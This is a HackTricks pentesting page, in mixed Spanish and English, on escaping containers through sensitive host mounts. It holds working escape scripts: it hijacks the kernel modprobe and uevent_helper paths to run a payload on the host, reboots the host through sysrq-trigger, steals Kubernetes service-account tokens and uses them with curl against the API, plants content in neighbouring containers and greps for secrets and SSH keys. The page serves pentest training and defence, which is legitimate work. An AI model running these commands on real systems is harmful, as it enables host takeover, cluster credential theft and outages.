# Montajes de host sensibles

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los montajes del host son una de las superficies prácticas de escape de contenedores más importantes porque a menudo hacen que una vista de procesos cuidadosamente aislada vuelva a colapsar en visibilidad directa de los recursos del host. Los casos peligrosos no se limitan a `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, o rutas relacionadas con dispositivos pueden exponer controles del kernel, credenciales, sistemas de archivos de contenedores vecinos e interfaces de gestión en tiempo de ejecución.

Esta página existe separada de las páginas de protección individuales porque el modelo de abuso es transversal. Un montaje de host con permisos de escritura es peligroso en parte por los mount namespaces, en parte por los user namespaces, en parte por la cobertura de AppArmor o SELinux, y en parte por qué ruta exacta del host fue expuesta. Tratarlo como un tema propio hace que la superficie de ataque sea mucho más fácil de razonar.

## `/proc` Exposure

procfs contiene tanto información ordinaria de procesos como interfaces de control del kernel de alto impacto. Un bind mount como `-v /proc:/host/proc` o una vista del contenedor que exponga entradas de proc inesperadamente escribibles puede, por tanto, conducir a divulgación de información, denegación de servicio o ejecución directa de código en el host.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Empieza comprobando qué entradas de procfs de alto valor son visibles o escribibles:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

El valor práctico de cada path es diferente, y tratarlos a todos como si tuvieran el mismo impacto dificulta la priorización:

- `/proc/sys/kernel/core_pattern`
Si es escribible, este es uno de los paths de procfs de mayor impacto porque el kernel ejecutará un pipe handler después de un crash. Un container que pueda apuntar `core_pattern` a una payload almacenada en su overlay o en una ruta montada del host puede a menudo obtener host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
Este path controla el userspace helper usado por el kernel cuando necesita invocar la lógica de carga de módulos. Si es escribible desde el container y se interpreta en el contexto del host, puede convertirse en otro host code-execution primitive. Es especialmente interesante cuando se combina con una forma de trigger la ruta del helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente no es un primitive de escape limpio, pero puede convertir la presión de memoria en un denial-of-service a nivel host al transformar condiciones OOM en comportamiento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si la interfaz de registro es escribible, el atacante puede registrar un handler para un valor magic elegido y obtener host-context execution cuando se ejecute un archivo que coincida.
- `/proc/config.gz`
Útil para kernel exploit triage. Ayuda a determinar qué subsistemas, mitigaciones y características opcionales del kernel están habilitados sin necesitar metadata de paquetes del host.
- `/proc/sysrq-trigger`
Principalmente una ruta de denial-of-service, pero muy seria. Puede reiniciar, provocar un panic, o de otro modo interrumpir el host inmediatamente.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Útil para host fingerprinting, crash analysis, y en algunos entornos para leak information útil para kernel exploitation.
- `/proc/kallsyms`
Valioso cuando es legible porque expone información de símbolos exportados del kernel y puede ayudar a derrotar supuestos de aleatorización de direcciones durante kernel exploit development.
- `/proc/[pid]/mem`
Esta es una interfaz directa al proceso-memory. Si el proceso objetivo es alcanzable con las condiciones ptrace-style necesarias, puede permitir leer o modificar la memoria de otro proceso. El impacto realista depende en gran medida de credenciales, `hidepid`, Yama y restricciones de ptrace, por lo que es un path poderoso pero condicional.
- `/proc/kcore`
Expone una vista estilo core-image de la memoria del sistema. El archivo es enorme e incómodo de usar, pero si es legiblemente accesible indica una superficie de memoria del host mal expuesta.
- `/proc/kmem` and `/proc/mem`
Históricamente interfaces de memoria raw de alto impacto. En muchos sistemas modernos están deshabilitadas o fuertemente restringidas, pero si están presentes y son utilizables deben tratarse como hallazgos críticos.
- `/proc/sched_debug`
Leaks información de scheduling y tareas que puede exponer identidades de procesos del host incluso cuando otras vistas de procesos parezcan más limpias de lo esperado.
- `/proc/[pid]/mountinfo`
Extremadamente útil para reconstruir dónde vive realmente el container en el host, qué paths están overlay-backed, y si un mount escribible corresponde al contenido del host o solo a la capa del container.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Estos comandos son útiles porque varios host-execution tricks requieren convertir una ruta dentro del container en la ruta correspondiente desde el punto de vista del host.

### Ejemplo completo: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` es escribible desde el container y el helper path se interpreta en el contexto del host, puede redirigirse a un attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
El desencadenante exacto depende del objetivo y del comportamiento del kernel, pero lo importante es que una ruta helper escribible puede redirigir una futura invocación del helper del kernel hacia contenido en una ruta del host controlada por el atacante.

### Ejemplo completo: reconocimiento del kernel con `kallsyms`, `kmsg` y `config.gz`

Si el objetivo es evaluar la explotabilidad en lugar de escapar de inmediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estos comandos ayudan a responder si información de símbolos útil es visible, si los mensajes recientes del kernel revelan un estado interesante, y qué características o mitigaciones del kernel están compiladas. El impacto normalmente no es una evasión directa, pero puede acortar drásticamente el triage de vulnerabilidades del kernel.

### Ejemplo completo: Reinicio del host con SysRq

Si `/proc/sysrq-trigger` es escribible y es accesible desde la vista del host:
```bash
echo b > /proc/sysrq-trigger
```
El efecto es un reinicio inmediato del host. No es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que una mera divulgación de información.

## `/sys` Exposición

sysfs expone grandes cantidades de estado del kernel y de los dispositivos. Algunas rutas de sysfs son sobre todo útiles para fingerprinting, mientras que otras pueden afectar la ejecución de helpers, el comportamiento de dispositivos, la configuración de módulos de seguridad o el estado del firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas importan por diferentes motivos. `/sys/class/thermal` puede influir en el comportamiento de gestión térmica y, por tanto, en la estabilidad del host en entornos con exposición deficiente. `/sys/kernel/vmcoreinfo` puede leak información de crash-dump y del kernel-layout que ayuda con fingerprinting de host a bajo nivel. `/sys/kernel/security` es la interfaz `securityfs` usada por Linux Security Modules, así que el acceso inesperado allí puede exponer o alterar el estado relacionado con MAC. Las rutas de variables EFI pueden afectar ajustes de arranque respaldados por firmware, por lo que son mucho más graves que archivos de configuración ordinarios. `debugfs` bajo `/sys/kernel/debug` es especialmente peligroso porque es intencionalmente una interfaz orientada a desarrolladores con expectativas de seguridad mucho menores que las APIs del kernel endurecidas y dirigidas a producción.

Los comandos útiles para revisar estas rutas son:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` puede revelar si AppArmor, SELinux, u otra superficie LSM es visible de una manera que debería haber permanecido solo en el host.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante en este grupo. Si `debugfs` está montado y es legible o escribible, espere una amplia superficie orientada al kernel cuyo riesgo exacto depende de los nodos de depuración habilitados.
- EFI variable exposure es menos común, pero si está presente tiene alto impacto porque afecta a ajustes respaldados por firmware en lugar de archivos de tiempo de ejecución ordinarios.
- `/sys/class/thermal` es principalmente relevante para la estabilidad del host e interacción con el hardware, no para neat shell-style escape.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente para host-fingerprinting y crash-analysis, útil para entender el estado del kernel a bajo nivel.

### Full Example: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede ejecutar un helper controlado por el atacante cuando se dispara un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host en lugar de dentro del contenedor actual.

## `/var` Exposición

Montar el `/var` del host dentro de un contenedor suele subestimarse porque no parece tan dramático como montar `/`. En la práctica, puede ser suficiente para alcanzar sockets de runtime, directorios de snapshots de contenedores, volúmenes de pods gestionados por kubelet, projected service-account tokens y los sistemas de archivos de aplicaciones vecinas. En nodos modernos, `/var` suele ser donde realmente reside el estado de contenedor más interesante desde el punto de vista operativo.

### Kubernetes Ejemplo

Un pod con `hostPath: /var` suele poder leer los tokens proyectados de otros pods y el contenido de snapshots overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Estos comandos son útiles porque responden si el punto de montaje expone solo datos de aplicación poco interesantes o credenciales de clúster de alto impacto. Un service-account token legible puede convertir inmediatamente local code execution en acceso a Kubernetes API.

Si el token está presente, valida qué puede alcanzar en lugar de detenerse en el descubrimiento del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
El impacto aquí puede ser mucho mayor que el acceso local al nodo. Un token con un RBAC amplio puede convertir un montaje de `/var` en una compromisión a nivel de clúster.

### Docker y containerd — Ejemplo

En hosts Docker, los datos relevantes suelen estar bajo `/var/lib/docker`, mientras que en nodos Kubernetes con containerd puede estar bajo `/var/lib/containerd` o en rutas específicas del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si el `/var` montado expone contenidos de snapshot escribibles de otra carga de trabajo, el atacante puede alterar archivos de la aplicación, plantar contenido web o cambiar scripts de arranque sin tocar la configuración actual del contenedor.

Ideas concretas de abuso una vez que se encuentre contenido de snapshot escribible:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Estos comandos son útiles porque muestran las tres principales familias de impacto del montaje de `/var`: manipulación de aplicaciones, recuperación de secretos y movimiento lateral hacia cargas de trabajo vecinas.

## Sockets en tiempo de ejecución

Los montajes sensibles del host a menudo incluyen sockets en tiempo de ejecución en lugar de directorios completos. Estos son tan importantes que merecen repetición explícita aquí:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para los flujos completos de explotación una vez que uno de estos sockets esté montado.

Como patrón rápido de interacción inicial:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## Mount-Related CVEs

Host mounts also intersect with runtime vulnerabilities. Important recent examples include:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.

These CVEs matter here because they show that mount handling is not only about operator configuration. The runtime itself may also introduce mount-driven escape conditions.

## Comprobaciones

Usa estos comandos para localizar rápidamente las exposiciones de mounts de mayor valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- La raíz del host, `/proc`, `/sys`, `/var` y los sockets de runtime son hallazgos de alta prioridad.
- Las entradas escribibles de proc/sys a menudo indican que el mount está exponiendo controles del kernel globales del host en lugar de una vista segura del container.
- Las rutas montadas en `/var` merecen una revisión de credenciales y de cargas de trabajo vecinas, no solo una revisión del sistema de archivos.
{{#include ../../../banners/hacktricks-training.md}}
